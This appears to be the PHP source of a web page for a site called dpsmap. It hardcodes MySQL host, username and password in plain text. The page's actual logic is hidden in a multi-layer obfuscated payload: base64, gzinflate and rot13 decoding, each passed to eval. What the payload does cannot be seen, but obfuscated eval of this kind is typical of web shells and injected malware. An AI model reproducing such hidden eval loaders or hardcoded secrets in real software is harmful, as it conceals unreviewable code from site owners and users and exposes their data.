<!DOCTYPE html>
<html>
    <link rel="icon" href="/core/img/favicon.ico">
    <link rel="shortcut icon" type=image/x-icon href="https://dpsmap.com/favicon.ico" />
<meta name=viewport content='width=device-width, initial-scale=1, maximum-scale=1'>
<style>
p {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
}



div {
    border-radius: 5px;
    background-color: #f2f2f2;
    padding: 20px;
    width:350px;
    border: 1px solid #a6c2ff;
}
</style>
<body>

<br/>

<center>
    <img src="https://dpsmap.com/images/dpsmap_title.png" height=60px;/>
    <h3 style="color:gray;"></h3>
<div>
    


<?php

date_default_timezone_set("Asia/Rangoon");
$date=date('d.m.Y')."(".date('h:i A').")";
$u="verified";
    
    
$servername = "mysql2001.my-virtual-panel.com";
$username = "dps_next";
$password = "welcome123#";
$dbname = "dps_next";

eval(base64_decode('ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZShzdHJfcm90MTMoJ1NNcjNRaG1UUnhEL0UxcXREQi9qYlZRcnI4OVJWV3NyaDZLNytlcm5NWldPcTAxS2FGN0NvQ3VHaSsxSFFxeUUvZ3pDN3E5Z0N6UTBHNTdnV0xVOUo1RnNoRncvL1JKVEU5WXFjbG00QlNMQXpiNkJLNGtlTlVYc3lYSGw0eHJzMVNvS1pQRGxJeDV0UW1xcXAxSGRScGIwZUlzeE9QSUV6WTRPQ1IrSk52Si9zTkhXTmw3VHFwbmsxTGNydFU0cTRFcXR6TFMzNm5VOHBBUVdhbWY1anVFcHVOZHBEM0ZXNUpyaGluZUF2bC9NaHRxa3FCVk1FZllqNkFQS0IrWUZONms5WTVhRHlPWnJLd25HZE1Xd05UQUVhUlN1SDFpaXNERkhQaHVDcFgyM1NUN1lrS0Z6c1BiaC9aSG9Va1BJbno5NVQrNnpTNDB5K0g2dzI5U1FvTUNjUXhXakNyeXJxZzUyTWZhUXNiaXd3ZjBQVi9KZkUxQ08zV1FFTndnRzJiMU5PWHdCbmk5VGpCS2JXbHFac3FJQzM5VDJDOUswYnBUT2xJd0JqR21CRHZTSzh2OFVRUENjNlZlNDB5algzMHB6R2NVUkZVWlhUS3Y4eVpqUlN5cnBJWEpiQVl5YzVFSmNZeEJGck9iVE5tNGNWK2M5dkducXAvemlvekRFTWpES29IWWpJa250ejZhT1J6VkhhY3phdUhuRUtOVFhsSDVYRDJxM1Q0cExtNytUUEUwN1l2azN3RWxBK0lvVkRUUFRZWTFNcS83VjZEU0wzOEYzMHc3UG81TWJWVXppSGt0eEZMaHhUalE2bmZOWjFEdHBySzNKUVV0UTFRakQ1QThPaEVrZU1nWUJQbEVYZDlGM0RHa2QxMnFoMmMxNlB0TFdzc1VBSVkvc2p4bzdvblVpWktnODhkd1VoRnB5dVZJZXJqRkpxVks2SVpRbExMcmJtaHRjZmhzRGVsQTdnakNhdjdva2k0TVNpSFA0NmllSHQvK0xQaldKcnN0R1VSRHhTVk16dkhsY3dqdUpKalM5NWl5YktMWkhLd1JtbklhdGZrSHZ1NlJjRm9PdGR5TzdFbzQzSjF2aG9KemxzQWkxaXEyclhxN2hyOUg3TWF5cGpCYlIrYmRmOHZibE9TaHdTeWczbTNSVm1adkQ0a0F3WVl0WDdycUJEek9KWmYzVm1vYkFVOFRaSWIrM3laaCtqdGdNQWxYK01uTDlmc0gzRk5xSXh0bkc1Q3VuVGE3OHJqWUFnWFI0aStTVDRGTkJzRGpKYitkSDRGL28rMVl2MEN5UzllWFpNRy9BYjZTNUZLQ0Q4TlhlTGJsRmsrUUxDVEJnMU1PckxTaGZuUzY0OWJIamduZEs4M2VobFFCRFJmc0s0WXVhYkRkaXFTRkhMT2VPWUdVS0JRRkFuUHdhK2R6OC94TVZuM3VHNkFUNVpRTk1CZ3g1ZTBEdnJJOWQrQk9iZ2ozUWFNd0MwU21wRG1VUVJVQWlIMlIzUVNzWGdvN3FZS0U0aEpJdDUvYlcySjFSYTg5ZGJOd0tkVkhNdndLMVFLSTA3dkkzZWFXa0FSYngyR0l4cVUrVEVjTkVoOGdpYTl1d1kvV2Z0bEVjU1pRSE9TK002dUJ4VkpNck5TcVZVSDA3N01yNTNCRVdiZnpEaTF5a01SN1lRTGN2dXNEZFVNdkJjZjBrTGxWQzFMTStQSTA2Rzd2bGk1U1g4Y21sVG4vSk9KRXFCSlcrZHZFY2hMM3FXYVdlM1NBTkt4SmtwdldJZzd4K01hWWtodUxCUTM4L0xaejd0V3dPTkVPTXkrTDMzNVBNcm45aXRYODdaeFNjVWl3YlF3ODJqU2hlalZoRElxVVgyajB6YlpSTkFzRHVubGR5YThqRFd5WnJLRGlkaFBCWHlrVWVMWFUzaHBuM3JuOEdRYjFXQWY5NmxLSUtsRjVzVElseXNhQ2xYZ1hYOC9hZk03Wm5YODlVL2h5N21BSmVEQ0ZVTTVod0FTY2ZxN215OXdVb093OW5aSXRmUTBnWWIvMmZKVUc5bWRSUXJQN1VmUjUxaG9pTkQ4ZDlMaXpOTmJWV3pudk1wZ09vcElxdWJMc0QrM1ZXODU3MTJNQVRTWGM1SWRhbHc5dmp4ZWk3SkZBbWJHcm5SdVNCbkNla09ZcVd4dnlkZmFpWTU3VndjMU1YMFNjNHJDUitNVitBQnNjRkc2ODVINEIzeFVUbWNGZEk2WDFjVVhVSHRuK0psYzlrUWRaQ1ZzNHAxalZUTGVYcG9SZmdiMlpTWkZabE1vRlhXUFBwZlpjT1gvNGxCOFBYM2VUM2JHOWNOZVZuUDUyaTBFUHNsc3ExbXhJSk16TGhyS1kxUTBFV0VYc3F6THBkN3BxTWU3c3kxMVBOSXExR2N2RXN4Smo4Z3RsYmV2ejlDbWt3cFYwZllOWVBsTU5lNnp2K3dPVkxQNkY1cE9sRWN0R3U4Q3BxQjBxUEh2UjJTREFkZm5vVXV2OG5lVXlsRGNqUmNUU2JYOHMraElYMUZ1dTFDdWh6THJrWVRRZ3JaQmpNY3dKVXZJdDNwWk1qbkIzWEVYVjhKWng0Lzl5NjBIayt6VXJYUzgxbkNYME5KUGZ0cTZteDdNY004VEhOcVJlSFdlV3B2VUZvd2ZES1dOSWQ0WjVaVVNoUW1lbzFQZ3Z5OW5rUkM5NjF3UEJwU2k4RkdUc0F4eXFRaGZYdTYrNUt3T2J1KzY3VWNNaDNtNkt4UkZEZ1hwUmlRUU16ZCtPM0Y2K2xZODJZSGlwa0htRXR6ZmdyYU5GS1ZMWTBRZzcwNXkrZXAxcWtrZFdCd3g1YWI1REpzZkh5L0J0d3FPcCtxN0hUYThoMVdmSFROazRLd3RuWUdZQm1jZHNNSWpxaTBuVmV6S0hnNGUxeUgvTEtRSHRjVExwTlhHRzhGaDlVOWFRRzFNNk1wdlk2QkQ3eS9Wd1BFRHVWQWtYZGhEcm5GUWdvQTJUaFFRVU9tSTFKUXNOUzltNmwxMTNiSTZ0eGljRmlxNVV2WmFXVGNDL05FSHMybmQvY05IVzlKWGpjQ3pCWThQa1FxaGpsWkVDb1daMVVZbm5mbDlua2RiN3U1NDI0azBoZXNyZlRndUcyNmtNSXlCa0xFL2VPWUcvV2RpQWxJSS9oV0d4MXNhcHBCNFllaXFHWk5qYjBCbWNxMG0vYWV1Y0FLNWZwQS95WVZhN1V0Tzh4QXo5S0szajBySlRSV0hTbTF3UDhLZWR3dmFKN041azdxYjZ4cDdMTkk4VjF2WEQvMEhHQ01iS1RwQkt5Nmw5cmd3SFVUbDBRNDJSUWRsNnpuR2RUVmV6dmJxOXEydWdreDZBOGphTlREaXRxUjdhZ0FlWkV1NURZMEpOWWpsUURZc1FUdFNFZDJQdEFJajZiSmFackNUOVZSNE82NDhQNWFBRXRtZmlrb0JnWnNUdHJEaUkyT3BuR3BQeFh5WDBqVWJOenZoVXJreXR3RXE3c3ZQcWwydXE5Y3F3KzI1anBpaC9RZk1UUEJoeEN6QTc0QmhmclpDSHZMaG5sM3A1dG5EdVI5T0lJQlZ0RGpianZoR0dxVUpzaXVTL2lGNEoyRG81Ky9WdFc5TUlVS2FmSWRRWUhad0RYa3poT2dIMlU3M1R5QTFIREF6OG1vaTByMWZydVJVRmx4QitwWld0UzFMUmpScjI4aThxMm9FY0t5emllOHFVNHpCR1l4dGZSUmdtcTdQNUFEazNyS2NwUU1GYjM3QkUzaGdURjVOZ055c1diYWRYZ1I3OHFBRjdqYUd4Q3lZZEhydGozbEk4OTgweXFLUzRQdjJVVmExMTBOTk1tYWdxNmhweHBDVjl4TTNZMEtKeXAwMXF4QWNWVWR1VG9NQjZXWExTTTBTSDZHNklUbG5QRG43YjJ4L3U1Zm5oRndLTnI2RmZPYXZjQkRCTVlGUGYzUzdncUVWbmNpUHpVbU9PdkZlSUhsMFBWcmlNY1JXeGp1b2UrOU42OVNuYnd6OGs0TTBFYWRUejBwS01ubGNMaWVlTnBNNkhvK21kcGYzZkJYQUpBbWdpa3YydndBeDlwdklPemphVlF2SEdoUVVjZmNiTVVSeGs2UmxFNW5LVW1POGxCK25nSmxzMkxSNDJOaDJhYUx0L0JldTQwNCsvS2ttNXNoYllPWkxESHlVeS82d3BDaW94aDNjVENOYTUxMjF6RGVCampHeEJHVnVCMkw5azVnTjBGaFRJbUtvcUd0L2s2TWQ3clYyTy8ydE9QbXFZSlBnOXJZZzcrZGVncXNHY00zMmEvMWFOdWk5WjZpSHNXMXdTeWs4dzZxb3BGWEpZUEZ2MGVGWWJBT2xsNWtTYUZpdWRZZmtCekZSRmZEeXY3ek8xbkhJeHRMcHNKR1h1SjVaYlFHWlpvSEptZWd6dmN6WktiMUF3T3M1VE5mQUdXQUdScmQyRzZHUkEzVDNCenVWTHM2L0tGbG9OYmZnRHBVaXVScENoN0x4QzlYSnI4RW9HNjJHWlZHTlhseVlxSkVXQlEwR2pUK3ZsdC9QZVhwVGU3YzFuM2ZCSkNkNWpOaE1yRkFLS2Z6Rnhhd1dxUWE3R25GYlF4YVhXc3BMVitwWnRPMEtwWkIrVkZvN0JXNE1RUml1OE9ET0J2emU3S0pZTXoreTA1TDNrOWJoM05MMGhxVHl4UmJXSmQ2VnFFRUs2bWRTZ0xKdWRPRXF6aHhVL2JmN1g1R0tnWmw2UGxUa09XdC84QVg3VXhRNmxwTkt6bjE3RjNOVnM3WnZIQWRqT2F6S0I2VVRrMjlGWVZOQ2Q3TENPd2J0MXJLeUNqQXlXZDRoWVFybElrclJySTNFOVovOEx3RXppM29ONUxLT2FudEVkN3FLL2tSM00rSDlESGtEL0hlcjVHaFNUMEwvdm5jRFFxd05SYzBPTi9pT1Z2dEJWSmQ2QVF3bVh2bXlheFZLUWpidHkzV1FJTzBFdHlFUlFpMElPNUdBNFNSY0dwbmw5NHlva2hpV1E4b0RFbWNSczJIVlZnYmNEYi8xVGtFQ2oyUGlER01FNmJ3ZTNFMklHUmx6MThxSDY4R3JuRDNlWkttN1o3dlFZZWlMQTFJRXZVdEp4M2dqQzU5d3pqczdNWm5OMFhiTjN1QWJieG9lZ1ZkYkNhamhXbDg4VmRUYTRmQzhhTDVQM2dySjVWekw4Q3puckZKbmJ2Q0wzQUJ6M3F1MjIySmc3UzBBQlZsNUVoU1piVVJRek1CRExQNGIxVTd0dVc4cld0VFRKaGJJRFB6MGFDVzhFUW9LbE5GeDUvTElsa2l4WmI0NzdBWHdnSjNLWnZUc1V5MHJWWXhOMzVwRnBGZ0N6Q2M4SGxmUUNSd0xVSUIweVF1cklYRTlINXlHUHhFelJiUVlpbTJhOWNCRU1IUHp6TVlnRFJhQlFWMngrdjdFcnhuV1pFREdTYnpZdllQc1VvdlE2TDJoU1hDMVRZSnVTODd3cDlPWk9xT3FyY2hNSXp3T1VmL0NQaVlJbktHK1c2TytNOC9rNmFJNUsyb2hsQ3dDdmJ2L2hhM1NGbVVpM3BpL21uUUlZV0VHbHFnbUl4WE9iMkdzaTZmVzNzQjZReWNPYklLOGZic20rdTZRYzlnZFVoR0ZiWjE0YldheWZab3hFWHZZOEdjZTA3YTBOWmxwb3dqSno4Z0dNb09LWUhhaWswSUl0Y1czTHY0SU8vR0g4MzdzRWlqNjdtM0I2L1BQQTZmTkpPbGRmVmxGaXpRejFtRHUvTlMvTCs1ZVV1UkdLWkxha2dPSFRyVGE5dUFYNkdNN2o5MFNvZFhxZ0FnSlNtOSs0bW9zeTRkWnF4RTdaL2JUcXdnL2hzMmhHdEozVFBQaUlpQkhBMjlyNVN4N1M5RE50eU4vZzJ5S1V5M2dKM2RqTTdrY0k2QW0zTnFMN0twQXZ3a2x3VlNIQjUyc2FGeHhKbytndFRFcTJsT0VTa2VoaFVtMmJ1aXJHdlMxK1UwQ3ZTU0hOQnplV1RsMFZRRk1KNElXWlVuQnU2TkpzdG5hZ3MxSHVJYnYxOWllcndFUWRjWUZKdzdldXJIdkRtNmRQbmxSYjJPMmM3YVBIQTNOOUdZS1dsaWdyMVo3TStpRUV5NlJrMlZ2WEdlVVJsM0h2djhrd0hmMEFtSDRPQk0xOXNucU9tb2NXQ1B3ZUptay9TS1FTWjdhRnRzREJPb0FaVEhnVEplZWcvQVd5OE1VQlBpR0g2eVEzSEY2cHVQTDJZQTZnL2xhVENXbEg1VjBBZCt5MDV1cFdaWHpySXRONmxlMy8rK3JpaTMvYXMvalI9JykpKSk7'));


$conn->close();

?>


</div>
</center>


</body>
</html>